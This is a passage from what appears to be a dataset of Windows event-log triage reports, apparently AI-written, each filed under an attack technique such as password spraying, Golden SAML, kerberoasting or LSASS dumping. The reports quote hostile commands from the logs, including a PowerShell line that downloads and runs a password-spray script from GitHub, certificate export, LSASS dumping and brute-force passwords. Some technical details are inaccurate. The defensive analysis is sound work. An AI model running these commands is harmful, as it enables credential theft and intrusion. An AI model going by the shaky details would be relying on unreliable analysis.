1. **Further Investigation**: Perform a deeper examination of the logged PowerShell scripts and scrutinize recent system changes or network connections from `admin_test`.
2. **Monitor User Activity**: Check the activity history of the `admin_test` account and enforce stricter auditing policies to track any anomalous log-ins or usage.
3. **Review Cryptography Operations**: Analyze the cryptographic keys involved in these events to ensure they are authorized and legitimate.
4. **Update Systems and Security Measures**: Verify the integrity of all updates, especially those from Microsoft Edge, to prevent exploitation through update channels.

Engage in further log analysis and possibly a memory forensics investigation on the host to confirm if such activities stem from authorized user actions or if they are indeed part of a malicious endeavor."
Dump Kerberos Tickets from LSA using dumper.ps1,"### Detailed Analysis of Windows Event Logs:

#### Suspicious or Anomalous Behavior Identified:

1. **Time Change Events**:
   - **EventID 4616 (Time Changed)**: The logs show two time change events on `2024-10-20 20:39:22`. The time is first set backward, from `20:39:29` to `20:39:22`, and then set forward, from `20:39:22.3729283` to `20:39:22.3737850`. This alteration took place via `svchost.exe` operating under the `LOCAL SERVICE` account, indicating normal services. 
   - **Concern**: Time manipulation can indicate malicious intent, as attackers might change the system time to evade detection mechanisms.

Password spray all Azure AD users with a single password,"**Log Analysis and Findings:**

Upon analyzing the provided Windows event logs, several activities stand out as potentially suspicious and indicative of malicious behavior:

1. **PowerShell Activity with Credential Handling and AzureAD Connection:**
   - A PowerShell session is executed with commands importing the AzureAD module and performing actions related to credential handling (ConvertTo-SecureString) and connecting to AzureAD.
   - The script seems to perform a password spraying attack, as indicated by trying a specific password (""P@ssw0rd!"") against multiple user accounts.
   - This is particularly concerning as it involves credential manipulation and potential unauthorized access attempts, indicating a clear intent to test or compromise user accounts.

2. **Use of PowerShell in Conjunction with System Utilities:**
   - Multiple sysmon logs indicate the execution of `powershell.exe` and monitoring/manipulation of local system utilities such as `wevtutil.exe` and `conhost.exe`.
   - While these utilities may have legitimate uses, their sequential execution together with PowerShell activities may point towards preparation or execution steps of malicious intent.

3. **EdgeUpdate and Setup Activities:**
   - Events show installations and updates related to Microsoft Edge, which might be routine; however, the overall context and the high volume of related logs could also suggest potential misuse of installation processes as a cover for malicious actions.

4. **Security and Privilege Escalation:**
   - Security logs show various entries from activities involving ""SERVER002\\admin_test."" This user account might be exploited or used by an attacker due to the observed pattern of events involving privileges and credential access.

**Assessment:**

Based on the identified suspicious PowerShell activities involving credential abuse, this set of logs carries clear indicators of malicious intent, especially with its use in a password spraying attack effort. This activity is a significant risk to the security of the system and potentially other connected systems if successful.

Access Saved Credentials via VaultCmd,"Upon analyzing the provided Windows event logs, several patterns and events potentially indicative of suspicious or malicious behavior can be noted:

### Observations:

1. **Time Change Events**:
   - There are several `EventID: 4616` logs indicating that the system time was changed. The ""NewTime"" is set before the ""PreviousTime,"" which suggests a backwards adjustment. Such behavior can sometimes be associated with attempts to manipulate time-dependent systems or logs.

2. **High-Privilege Account Activity**:
   - The `EventID: 4672` logs show the account `admin_test` being granted a significant set of privileges, including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and `SeImpersonatePrivilege`. These privileges are potent and could be leveraged for actions like privilege escalation, sensitive data access, or impersonation of other users.

3. **Frequent Process Execution**:
   - There are multiple entries of processes such as `wevtutil.exe`, `whoami.exe`, and `hostname.exe`. While these processes themselves are not inherently malicious, their frequent and sequential execution is worth noting, especially if not typical behavior for the `admin_test` account context.
   - The use of `vaultcmd.exe` to list Windows credentials (`vaultcmd /listcreds`) is particularly concerning as it suggests credential access attempts which are typically not part of normal routine activity.

4. **Logon and Privileged Access**:
   - Events related to `EventID: 4624` indicate network-type logins (`LogonType: 3`) with the `admin_test` account. Coupled with high privilege assignments in the same session (as seen in `EventID: 4672`), this could be indicative of unauthorized access or service account misuse.

5. **Command Prompt Activity**:
   - Execution of `cmd.exe` with commands to list credentials and other process interactions suggests possible interactive sessions that are unusual for server environments, especially concerning when done in a high integrity context.

### Assessment:
Based on the logs, the activities surrounding the `admin_test` account, its attempts to list credentials, its high privilege assignments, coupled with system time being adjusted backward, signal a potential compromise. These behaviors deviate from expected operational patterns, especially within a server environment.

### Guidance and Resolution:
Given the potentially malicious nature of these activities:

- **Resolution**: MALICIOUS
- **Actions**:
  - **Immediate Response**: Isolate the affected host (Server002) from the network to prevent further potential lateral movement.
  - **Investigate**: Thoroughly review any additional logs or alerts related to the `admin_test` account. Investigate credential exposure and verify with IT staff.
  - **Credential Review**: Reset credentials for `admin_test` and other privileged accounts.
  - **Monitoring**: Increase monitoring on similarly configured systems and perform extensive checks for potential unauthorized access points or backdoors installed.
  - **Forensics**: Consider engaging a digital forensic service to ascertain the full scope of the incident and remediate any compromised systems.

Adhering to these steps will help in both understanding the breach fully and ensuring resilience against future incidents."
CertUtil ExportPFX,"Upon thorough examination of the Windows event logs, several findings are notable for potentially indicating suspicious or malicious activity:

1. **Time Change Events**:
    - The logs from the Security, System, and Application channels reflect several instances of backward time changes. These indicate that the system time was set backwards multiple times within a few seconds. This can be used to hide activities, update logs manually—for example, tampering with log timestamps to disrupt forensics—and generally suggests some form of tampering or anomaly.

2. **Suspicious PowerShell Command Execution**:
    - Multiple Sysmon and PowerShell logs show execution of PowerShell scripts with command lines that include downloading and executing scripts from a remote location (`https://github.com/...`). This includes use of `IEX` (Invoke-Expression) with `Invoke-WebRequest` (IWR) and `certutil.exe` to download and manipulate certificate exports (`certutil.exe -p password -exportPFX ...`). Using PowerShell for such activity is typical in sophisticated attacks, as it allows scripts to execute code from the internet directly.

3. **Use of `certutil.exe`**:
    - The execution of `certutil.exe` with parameters related to exporting certificates is unusual unless performed by an authorized system administrator or software explicitly requiring it. It might be indicative of credential or certificate theft.

4. **High Integrity Level Processes**:
    - The processes initiated by the user `SERVER002\\admin_test` have a high integrity level. This includes execution of PowerShell scripts and certifications operations, indicating elevated privileges were used, often indicative of privilege escalation.

5. **Process Execution Context**:
    - Multiple events of process execution by `SERVER002\\admin_test` and NT AUTHORITY\SYSTEM indicate possibly unauthorized use of system privileges. The use of `wevtutil.exe` and `conhost.exe` in rapid succession can be expected but needs investigation under suspicious conditions given the time tampering.

Based on these findings, the results suggest an anomaly potentially indicating malicious activity. The backward time adjustments, coupled with the sophisticated use of PowerShell and certificate utilities, strongly suggest possible cyber espionage or data exfiltration activity is or was taking place. 

**Resolution**: **MALICIOUS**

**Guidance on How to Proceed**:
- **Immediate Isolation**: Isolate the affected host `Server002` from the network to contain any damage and prevent further propagation.
- **Forensics and Analysis**: Conduct deeper forensics investigation to uncover full attack scope, validate the presence of malware or unauthorized scripts, and identify any extracted data.
- **Examine Network Traffic**: Review network logs or setup capture to monitor any suspicious traffic to external IPs, especially those affiliated with the command lines seen in PowerShell logs.
- **Restoration and Hardening**: Consider restoring the system from a known-good backup and implement more stringent endpoint protection and monitoring (e.g., enhanced auditing, EDR solutions).
- **Review Admin Logs and Credentials**: Examine logs related to the `admin_test` account and revise credential policies to ensure the integrity of administrative accounts."
Create Volume Shadow Copy with WMI,"Upon analyzing the provided logs, multiple events stand out which warrant further scrutiny:

1. **Cmd.exe Commands:**
   - The execution of `cmd.exe` with command lines related to registry query checks and system information such as hostname and whoami queries indicate some level of reconnaissance or system introspection being performed. While such commands can be legitimate in administrative contexts, their sequence and frequency might indicate exploration or preparation phase for further actions.

2. **Shadow Copy Creation:**
   - Events showcasing the use of `wmic` and `vssvc.exe` for shadow copy creation (i.e., `wmic  shadowcopy call create Volume=C:\`) is particularly noteworthy. This is a common technique used by attackers to create backup copies of a system before attempting ransomware attacks or other destructive actions.

3. **Usage of `wevtutil.exe`:**
   - There are multiple events showing `wevtutil.exe`, a utility to manage Windows event logs. This could suggest an attempt to clear logs or gather information about the logging configuration, another common action in preparation for or during unauthorized activities to cover tracks.

4. **Potential Time Manipulation:**
   - The kernel events showing time change using `svchost.exe` are suspicious. Time modifications can be related to attempts to confuse log timelines for hiding illicit activity.

5. **User and Privileges:**
   - The account `SERVER002\admin_test` consistently operates with high integrity, which could indicate legitimate administrative actions or potentially, its compromise for malicious activity. Additionally, there are security log entries indicating elevated privileges, such as `SeDebugPrivilege`, being granted. 

6. **Network Logon:**
   - There are logon events related to the NT AUTHORITY\SYSTEM, which are expected in some system processes, but if correlated with abnormal times or contexts, could indicate privilege escalation.

Given these observations, it is prudent to categorize the logs as **SUSPICIOUS**. The presence of shadow copy creation, potential tampering with event logs, and command executions around system information and registries requires further investigation to verify legitimacy or uncover potential malicious intent. 

**Recommended Next Steps:**

- **Correlate and Contextualize Events:**
  - Investigate whether these actions align with known administrative practices or scheduled tasks. Check if `admin_test` actions correlate with any known scheduled maintenance or changes.

- **Behavior Profiles:**
  - Compare the behavior of the `SERVER002\admin_test` account and associated processes against known profiles for this user, including login patterns and typical command usage.

- **Check Shadow Copies and Restores:**
  - Review if any subsequent file modifications occurred after the shadow copies were taken, typical of ransomware behavior.

- **Log Integrity Review:**
  - Confirm whether `wevtutil.exe` affected log integrity and if so, identify any missing logs or discrepancies in timestamps that could indicate tampering.

- **System Security Posture:**
  - Validate security configurations, especially around privilege access and controls, to prevent misuse.

Continue monitoring the system and maintain a readiness to escalate the investigation if further indicators of compromise are discovered."
BrowserStealer (Chrome - Firefox - Microsoft Edge),"Upon analysis of the provided Windows event logs, several aspects stand out that merit a closer look:

### Analysis:
1. **PowerShell Activity and Command-Line Execution:**
   - There are multiple logs showing PowerShell being executed with suspicious command-lines. The notable command involves accessing and manipulating files within the Firefox profiles directory, specifically `key4.db` and `logins.json`, which are commonly associated with saving login details and encryption keys.
   - The command appears to copy these sensitive files to a temporary directory `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\`, and subsequently removes them from their original location. This action is typically indicative of credential harvesting or exfiltration attempts.
   - The command also involves running `BrowserCollector.exe`, which could be a custom or malicious binary designed to further process these exfiltrated credentials.

2. **Usage of svchost.exe and conhost.exe:**
   - While `svchost.exe` is a legitimate Windows process, it being logged alongside this suspicious activity hints at potential misuse. However, nothing directly malicious concerning `svchost.exe` could be identified without further contextual data.
   - `conhost.exe` is repeatedly executed in a manner consistent with typical operations alongside PowerShell commands, but given the context, its usage alongside these activities could be facilitating the visibility of command results.

3. **User Context:**
   - Actions are performed under the user `SERVER002\\admin_test`, indicating that these operations were executed with elevated privileges which could be leveraged by an attacker to gain significant access and control over the compromised host.

4. **Absence of Alarms from Windows Defender:**
   - The logs mention Windows Defender is active (`SECURITY_PRODUCT_STATE_ON`). Interestingly, there are no alerts raised by Windows Defender, potentially suggesting that the malicious activities were not detected by the built-in antivirus, possibly indicating sophisticated evasion techniques.

### Assessment:
Based on the given data, the patterns involved suggest an illicit attempt to access and exfiltrate browser-stored credentials using PowerShell. The activities associated with the manipulation and copying of sensitive files from the user profile, followed by execution of custom binaries (`BrowserCollector.exe`), are strong indicators of a compromise.

### Resolution:
- **MALICIOUS:** The key PowerShell activities and suspicious file manipulations involving credentials and use of potential malware indicates a breach.

### Guidance on how to proceed:
1. **Immediate Response:**
   - Isolate `Server002` from the network to prevent any further data exfiltration.
   - Inspect the referenced paths and restore any critical files removed or tampered with during the activity.

2. **Forensic Analysis:**
   - Conduct a detailed forensic analysis on `Server002` to understand the extent of the compromise.
   - Investigate `BrowserCollector.exe` and its origin.

3. **Security Enhancements:**
   - Review and strengthen access controls for administrative accounts.
   - Increase monitoring and logging for PowerShell activities, possibly using an endpoint detection and response (EDR) solution.

4. **Awareness and Training:**
   - Train users on identifying and reporting suspicious activities.
   - Consider phishing awareness if the initial access vector isn't clear.

Taking these steps will help contain and remediate the identified security incident, minimizing impact and preventing potential reoccurrence."
Offline Credential Theft With Mimikatz,"## Detailed Analysis of Logs

### Overview
The provided logs include events from the System, Security, Sysmon, and PowerShell logs coming from a computer identified as ""Server002."" Our focus is primarily on Sysmon logs, as they provide detailed system activity information that could help identify suspicious or malicious behavior.

### Suspicious Observations and Analysis

1. **Command Execution via Cmd.exe:**
   - Event Record ID: `17939`
   - Process: `C:\Windows\System32\cmd.exe` executed with the command line `\""C:\\Windows\\system32\\cmd.exe\"" /c \""if not exist %%tmp%%\\lsass.DMP (exit /b 1)\""`.
   - Parent Process: Powershell.exe
   - User: `SERVER002\admin_test`
   - Integrity Level: High

   **Analysis:** The command attempts to check for the existence of `lsass.DMP` in the temporary directory. `lsass.DMP` refers to a dump file of the Local Security Authority Subsystem Service (LSASS). Creating or checking for `lsass.DMP` is typically tied to credential dumping attacks, where an attacker attempts to obtain sensitive information like passwords from LSASS. The fact that this is executed by a high-integrity process under an admin user (`admin_test`) makes it highly suspicious.

2. **Executing wevtutil.exe:**
   - Multiple instances of `C:\Windows\System32\wevtutil.exe` executed under the `SERVER002\admin_test` user.
   - `wevtutil.exe` is a legitimate Windows utility used to retrieve information about event logs. However, attackers often use it to clear logs or gather log data to cover their tracks.

3. **Use of PowerShell and Utilities like `hostname.exe` and `whoami.exe`:**
   - Execution of various system binaries (`hostname.exe`, `whoami.exe`), all under a high-integrity context by the `admin_test` user.
   - These are typical reconnaissance commands used to gain information about the system environment and the current user.

### Conclusion

Considering the execution of these utilities in a sequence, primarily targeting LSASS, and the concurrent usage of PowerShell elevates the suspicion levels. Additionally, the lack of a clear necessity or documentation for these operations from a legitimate operations context suggests the possibility of unauthorized access or an intruder exploration.

- **Risk and Threats:**
  - Credential theft attempt through LSASS could point to an attempt to escalate privileges or pivot within the network.
  - The use of wevtutil.exe might be part of efforts to cover tracks, indicating potential lateral movement or system compromise.

### Proposed Resolution

- **Resolution: MALICIOUS**

Given the level of activities aimed at credential access, potential evidence destruction, and lack of any plausible explanation or authorized context for these activities logged under the admin account, the events indicate malicious activity with a high certainty.

### Guidance on How to Proceed

1. **Immediate Containment:**
   - Isolate the affected machine (Server002) from the network to prevent further unauthorized access or propagation.

2. **Investigate User Account:**
   - Investigate the `admin_test` account for signs of compromise. Ensure that credentials are changed immediately if there are any indications of misuse.

3. **Forensic Analysis:**
   - Conduct a thorough forensic investigation of the system to determine the scope of compromise and identify any additional suspicious activities or malware present.

4. **Log and Monitor:**
   - Enhance logging and monitoring for signs of similar activities across other systems.
   - Begin monitoring for indicators of compromise (IOCs) tied to known attack vectors aiming at LSASS or other credential-stealing techniques.

5. **Communication and Reporting:**
   - Inform senior management and relevant teams within the organization about the findings and steps taken for containment.
   - Prepare a detailed report for further technical and strategic discussions to prevent future occurrences."
Request for service tickets,"### Detailed Log Analysis

**Security Log**
- The security logs showcase two Event ID 4616 which represents a system time change. This is executed by the `svchost.exe` process run by the `LOCAL SERVICE` account. The time change itself is relatively small and may relate to normal time synchronization activities.

**Sysmon Log**
- The logs show Event ID 5, which indicates a process creation. Among these, the most notable is the execution of `powershell.exe`:
  - The command-line argument for `powershell.exe` includes the download and execution of a script from an external URL (`https://raw.githubusercontent.com/scriptProject/script/.../Invoke-script.ps1`). This is highly suspicious as it might indicate a potential code execution or script injection attack.
  - Process executions for `wevtutil.exe` and `conhost.exe` are multiple and seem to be invoked together with other processes. This can be indicative of an attempt to tamper with the event logs, though it might be benign depending on context.

**Windows PowerShell Log**
- The presence of multiple PowerShell executions (Event ID 600) that match the potentially harmful command observed in the Sysmon logs reinforce the suspicion of PowerShell misuse for running unauthorized scripts.

**Application Log**
- The logs indicate Windows Defender is active (`SECURITY_PRODUCT_STATE_ON`), but there are no indications within these logs that it has detected and acted on any threat during this time.

**System Log**
- Time change events in the system log correlate with the security log entries, indicating time synchronization which might be normal operation.

### Assessment
The presence of PowerShell being used to execute a script downloaded from an external site is a serious indicator of potential malicious activity. This pattern is often associated with malware or unauthorized administrative activity, such as attempting to retrieve and run malicious scripts on the system.

### Resolution
**Resolution Status: MALICIOUS**

### Guidance on How to Proceed
1. **Immediate Action**: Isolate the system from the network to prevent any potential further compromise or data exfiltration.
2. **Deep Forensic Analysis**: Conduct a thorough investigation of the system to determine the full extent of the compromise, including looking for additional indicators of compromise (IoCs) and further malicious payloads.
3. **User Activity Review**: Verify the legitimacy of `admin_test` account activities and permissions; assess if the credentials have been compromised.
4. **Security Policy Enforcement**: Review and tighten security policies around PowerShell usage, integrating monitoring and alerting for suspicious command execution.
5. **Remediation Process**: Remove any discovered malware, restore from clean backups if necessary, and refresh all credentials and access control mechanisms on the affected network segment.
6. **Monitoring Enhancements**: Implement robust monitoring for similar activities on other systems within the network to prevent lateral movement or repeated attacks."
Golden SAML,"Upon analysis of the provided logs, I have identified the following key observations and potential indicators of compromise:

### PowerShell Log Analysis
The PowerShell logs contain recurring execution of a script that attempts to leverage the `AADInternals` module. This module is often used for unauthorized access and exploitation within Azure AD environments. Noteworthy actions include:
- **Import-Module AADInternals**: This indicates loading the module, which can be used to perform various internal operations on Azure AD.
- **Use of New-AADIntSAMLToken**: Generation of SAML tokens, which is commonly associated with a ""Golden SAML"" attack vector. This type of attack allows an adversary to forge Single Sign-On (SSO) tokens and impersonate any user, bypassing the authentication controls.
- **Attempt to Establish Connections**: The script tries to retrieve an access token using the SAML token and might indicate lateral movement or unauthorized data access attempts.

### Sysmon Log Analysis
- **Process Execution**: There are several executions of `powershell.exe` initiated by `wsmprovhost.exe`, a process related to Windows Remote Management. These processes are executed by `SERVER002\admin_test`, which might indicate either an insider threat or compromised credentials.
- **Wevtutil.exe Invocation**: Presence of logs showing `wevtutil.exe` being executed in quick succession. This tool is used to query or export event logs, which can be indicative of an attempt to cover tracks or gather information on the system's events.
- **Command-Line Executions**: Use of system utilities such as `whoami.exe` and `hostname.exe` might suggest reconnaissance or environment profiling by the attacker to understand the permissions and the system's configuration details.

### Assessment
The collected data strongly suggests that malicious activity is underway. The use of the `AADInternals` module along with specific commands points to a potentially ongoing exploitation attempt targeting Azure AD services through forged SAML tokens – a classic ""Golden SAML"" attack.

### Threats and Risks Identified
- **Credential Compromise**: The attacker may have gathered and exploited valid administrative credentials to execute these scripts and commands.
- **Lateral Movement and Data Exfiltration**: The activity indicates a sophisticated attempt at gaining persistent access and potentially exfiltrating data from Azure AD integrated services.
- **Potential Evasion**: Use of native Windows binaries (`wevtutil.exe`) may indicate an attempt to avoid detection by tampering with or exporting sensitive logs.

### Guidance on Proceeding
1. **Immediate Containment**: Disable the `admin_test` account pending further investigation and confirm that no unauthorized accounts have been added or altered.
2. **Forensic Analysis**: Conduct a deeper analysis of the host and network traffic to identify potential data exfiltration paths or additional compromised systems.
3. **Review Azure AD Logs and Configuration**: Analyze Azure AD logs for unauthorized access and reconfigure AD services to enforce stricter access controls.
4. **Patch and Harden**: Ensure all systems on the network, including this host, are fully patched and hardened against known vulnerabilities.
5. **Incident Response Coordination**: Engage with the incident response team to assess and apply broader defensive strategies based on findings.

### Final Resolution
Based on the evidence, the logs contain activity that is conclusively **MALICIOUS**. Immediate action should be taken to mitigate further risks and assess the extent of the compromise."
Password Spray (DomainPasswordSpray),"### Detailed Analysis of the Logs

#### Anomalous and Suspicious Behavior

1. **PowerShell Execution**:
   - Several PowerShell events indicate the execution of a script downloaded from a remote URL:
     ```
     HostApplication=powershell.exe &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
     IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing);
     Invoke-DomainPasswordSpray -Password Spring2017 -Domain $Env:USERDOMAIN -Force}
     ```
   - The use of `IEX (Invoke-Expression)` with `IWR (Invoke-WebRequest)` to download and execute a script is a strong indicator of potential malicious activity, typically used in attack scenarios like password spraying or credential harvesting.

2. **Privilege Escalation and Process Handling**:
   - Security logs show a `4672` event, which logs special privileges assigned to a new logon:
     - Privileges include `SeDebugPrivilege`, `SeBackupPrivilege`, etc., which are commonly associated with high-level privileges needed by malicious actors.
   - `4624` event logs a network logon type (`LogonType = 3`) with NTLM authentication, which is common for lateral movement within a network by an attacker.
   - Multiple Sysmon logs show typical process creations like `whoami.exe` and `wevtutil.exe`. While these are legitimate processes, the context of their use shortly after the PowerShell activity could correlate with investigating privileges or evading detection.

3. **Time Manipulation Events**:
   - Security and system logs display abnormal activity involving time changes (`EventID = 4616` in the security log, `EventID = 1` and `24` in the system log). This behavior can indicate malicious activity aimed at manipulating time-stamps to evade logging or auditing.

4. **Edge Update Process**:
   - Log entries related to `MicrosoftEdgeUpdate.exe` starting and stopping appear benign on their own. However, they may correlate with other activity to mask a timeline.

#### Assessment and Threats Identified

- **Malicious Activity**: The PowerShell command clearly indicates an attempt to run a password spraying attack using a publicly available script. This kind of activity is characteristic of an initial access or privilege escalation technique in cyberattack processes.
- **Potential Lateral Movement**: The events associated with credential abuse and network logons suggest possible attempts at lateral movement within the network or preparation stages for such movements.

### Guidance and Next Steps

1. **Immediate Action**:
   - Isolate the affected system (Server002) from the network to prevent further credential abuse or external communication.
   - Revoke any credentials that might have been compromised or accessed during the suspicious activity.
   
2. **Further Investigation**:
   - Conduct a full audit of systems and network traffic for any other anomalous behavior.
   - Review security policies and logging configurations to ensure comprehensive logging.

3. **Long-term Recommendations**:
   - Enforce stricter PowerShell execution policies. Enable PowerShell logging to capture detailed script execution events.
   - Implement network segmentation and zero-trust principles to limit lateral movement potential.
   - Educate the team about how to identify suspicious script activities and potential indicators of compromise.

### Final Resolution: **MALICIOUS** 

The logs contain sufficient evidence of malicious activity, specifically a PowerShell script execution intended for password spraying, indicating unauthorized access attempts using remote scripts. Further immediate investigation and remedial actions are strongly advised."
Rubeus kerberoast,"Upon analyzing the provided Windows event logs from various sources, a few items stand out that warrant further investigation:

### Application Log
- The repeated events indicating ""Windows Defender, SECURITY_PRODUCT_STATE_ON"" suggest that Windows Defender is actively running on the machine. This is expected and does not indicate any issue.

### Windows PowerShell Log
- The PowerShell logs indicate execution of a command that uses `klist purge` and executes a script located in a temporary directory: `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script.exe`.
- Command execution from a temporary directory is unusual and potentially suspicious, especially when running a script from that location via PowerShell. This behavior is typically associated with execution of potentially unwanted or malicious scripts:
  ```plaintext
  powershell.exe & {klist purge; cmd.exe /c \\""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script.exe\\ script  /outfile:\\""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script_output.txt\\""""}
  ```

### Sysmon Log
- Several entries involve `wevtutil.exe`, `cmd.exe`, and `klist.exe`. The execution of `cmd.exe` from PowerShell is concerning, especially with reference to running scripts from a `Temp` directory.
- Multiple `conhost.exe` executions may link to console-based activity behind a script or batch execution.
- `klist purge` is used to manipulate or purge Kerberos tickets, which could be part of regular activity if linked to system administration tasks. However, without context or legitimate reason, this might suggest attempts at evading detection through ticket clearing.
- High frequency of process events indicates a busy environment around the time stamps, with core system operations seen from processes like `svchost.exe` and `MicrosoftEdgeUpdate.exe`.

### Assessment
- **Suspicious Behavior**: The main concern arises from the PowerShell script execution and command-line arguments, combined with script executions from temporary directories. Such activity can be characterized as potentially suspicious because:
  - Temporary paths often serve as locations for drop and execution by malware.
  - PowerShell is commonly leveraged by threat actors for executing scripts stealthily.

### Resolution
- **Resolution**: SUSPICIOUS
  - The behavior needs more investigation, particularly examining the content and origin of `script.exe` in the temporary directory.
  - I recommend verifying if this script and usage pattern align with any legitimate administrative activities.
  - Consider capturing script content, related artifacts, and monitoring for repeated or similar activities. Initiating a thorough scan using an updated antivirus may also be prudent.

### Guidance
- Engage with any administrative owner of `Server002` to determine if these actions were expected.
- Elevate surveillance on Server002 regarding PowerShell activities and file creation in temporary directories.
- Run full security scans and ensure audit policies are appropriately set for scripting and temporary directory operations."
Extract Windows Credential Manager via VBA,"### Detailed Analysis:

Upon reviewing the logs provided, I have identified several entries of interest that may warrant further investigation, along with signs of potential malicious activity:

#### 1. **Windows PowerShell Log:**
   - Several PowerShell commands are executed which include execution of a script from a URL `https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1`. This behavior is often associated with malicious activity where scripts are fetched from the internet to be executed locally.
   - This script is invoked with the `Invoke-Script` cmdlet, highlighting potentially unauthorized actions, especially since it targets `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\src\data-macrocode.txt`, which contains a macro code. This could be used for delivery of payloads or malicious macros.

#### 2. **Security Log:**
   - Time change events (Event ID 4616) are recorded, where the system time was changed. Time manipulation can be a tactic used by threat actors to cover tracks or alter forensic timelines complicating incident response efforts.

#### 3. **Sysmon Log:**
   - Multiple entries of `powershell.exe` and `wevtutil.exe` have been executed by the `SERVER002\admin_test` account. The execution of these tools, notably `wevtutil.exe`, can clear event logs, which is a common technique used by attackers to erase their tracks.
   - Numerous entries showing the execution of `MicrosoftEdgeUpdate.exe` in different directories and with varying command-line arguments. While this could be benign related to legitimate updates, the volume and diversity of commands could also suggest misuse or a side-channel activity.

### Assessment of the Situation:

Based on the log analysis:
- The execution of external scripts using PowerShell and internet-based resources is highly suspicious.
- There is evidence of actions that could be associated with attempts to cover tracks using time modifications and event log manipulation.

### Threats or Risks Identified:
- The use of PowerShell to interact with external resources and execute scripts could be an indication of a download-and-execute attack technique.
- The time change events reflect potential tampering with system logs to impede forensic investigation.
- Excessive use of system update processes with varied commands might be indicative of suspicious subprocess spawning.

### Guidance on How to Proceed:
1. **Immediate Action:** Isolate the affected machine, `Server002`, from the network to prevent potential lateral movement.
2. **Expand Investigation:** Check for additional indicators of compromise on Server002 and other network segments. Use known IOCs from external sources such as the suspicious URL or SHA256 hashes to scan other systems.
3. **Script Analysis:** Perform static and dynamic analysis of the script fetched over the internet to understand its workings and payload.
4. **Review Accounts:** Audit the actions of the `SERVER002\admin_test` account, reviewing any anomalies in access logs or privilege escalations.
5. **Log Review and Integrity:** Confirm the integrity of logs across the system, checking for any deletion or modification of logs which could indicate further intention to hide tracks.

### Final Resolution:
**MALICIOUS** - The logs contain strong indicators of malicious activity, particularly considering the suspicious PowerShell activity and the execution of scripts fetched from external sources."
Dump LSASS.exe using imported Microsoft DLLs,"Based on the provided logs, the Sysmon and Windows PowerShell logs reveal some potentially suspicious activity that warrants further investigation. Let's analyze the key observations:

1. **Use of PowerShell**:
   - The logs record the execution of the PowerShell script with the command `C:\Windows\Temp\xordump.exe -out C:\Windows\Temp\lsass-xordump.data.001.dmp -x 0x41`. This implies the use of a potentially unknown or unverified executable (`xordump.exe`) to perform operations on `lsass.exe`, a critical system process responsible for managing system security policies.
   - Dumping LSASS memory is a known technique used by attackers to extract sensitive information, such as user credentials, from the system. 

2. **Execution of `xordump.exe`**:
   - The presence of `xordump.exe` in the `C:\Windows\Temp\` directory, along with an attempt to dump LSASS memory, is typically associated with malicious intent, especially without authorization or a clear business need.
   - The naming of `xordump.exe` suggests it could be involved in some form of data encryption or obfuscation during the dumping process.

3. **Integrity Level**:
   - The processes related to these events appear to be running at a high integrity level, indicating that they have elevated privileges, which is common for system tools but could be dangerous if misused.

4. **Software Origins and Versions**:
   - The logged events reference legitimate Windows system utilities (`whoami.exe`, `hostname.exe`, `conhost.exe`) which are typically not flagged for suspicious activity, but due to the context in which they appear (around the suspicious PowerShell usage), they become relevant for their potential involvement or misuse.

5. **Lack of Security and Application Logs**:
   - Absence of contextual data from Security or Application logs that could corroborate the activity's intent (benign or malicious) limits the current analysis.

Given the unusual use of PowerShell to execute a potentially dubious executable targeting a high-value process (`lsass.exe`), and the absence of legitimate justification within the logs, the nature of the command-line execution strongly suggests this activity does not meet typical administrative or benign patterns.

### Resolution:
**SUSPICIOUS** - The logs contain activities that are anomalous and potentially indicate preliminary stages of malicious activity. Further investigation is required to verify the legitimacy of `xordump.exe`, review any additional logging data that might have been missed, and ascertain whether this was a sanctioned administrator action or unauthorized access.

### Recommended Actions:
- **Immediate Review**: Verify the purpose and creation of `xordump.exe`. Check if it is a recognized tool by your organization or if it was recently introduced into the system.
- **Block and Contain**: If the file and its usage are unauthorized, consider removing `xordump.exe` and its associated outputs, and block its execution on other systems.
- **Credential Safety**: Monitor for any unauthorized logins or credential use, as dumping LSASS memory is typically aimed at credential harvesting.
- **Threat Hunting**: Conduct a deeper forensic examination across the network to discover if similar activities have been executed on other hosts.
- **Audit User Activity**: Validate recent activities by `SERVER002\admin_test` to confirm they align with expected or authorized administrative actions."
Brute Force Credentials of single Azure AD user,"### Detailed Analysis of Logs:

#### Indicators of Potential Malicious Activity:

1. **PowerShell Execution with Bruteforce Script:**
   - The logs show PowerShell being used with a script attempting to brute force Azure AD credentials. The command line contains a set of passwords (""Password1"", ""1q2w3e4r"", ""Password!"") to try against the account `bruce.wayne@contoso.com`. This is a typical pattern of malicious behavior as it entails unauthorized attempts to gain access to an account by guessing passwords.
   - This activity is captured in the Sysmon event with EventID `1` and the Windows PowerShell logs, indicating that PowerShell is used with potentially harmful intent. The command sequence explicitly describes a loop to try different passwords and log if they succeed or fail, which is outside the norms of typical administrative activities.

2. **Processes Executed with Administrative Credentials:**
   - Several instances of windows utility tools such as `wevtutil.exe`, `conhost.exe`, and `hostname.exe` being executed under the `SERVER002\admin_test` account. While these might usually be benign, in combination with the observed PowerShell activity, it indicates possible misuse of privileged accounts for executing potentially harmful activities or covering tracks.

#### Threats or Risks Identified:

- **Bruteforce Attack:** The presence of a script designed to test multiple passwords against an Azure AD account suggests a possible breach attempt. If successful, it could compromise sensitive information and grant unauthorized access to the organization's cloud resources.
  
- **Use of Privileged Accounts:** Utilizing an admin account (`admin_test`) for executing PowerShell scripts and system utilities increases the risk of malicious actions that could have broader implications if not addressed promptly.

### Assessment:

**Resolution: MALICIOUS**

The activity clearly indicates an ongoing attempt to brute force Azure AD credentials using a PowerShell script, which is a highly suspicious and likely malicious action. The execution of known system utilities by an admin account further supports the hypothesis of potential unauthorized actions on the system.

### Recommended Actions:

1. **Immediate Response:**
   - Terminate any ongoing sessions or processes related to the PowerShell script execution.
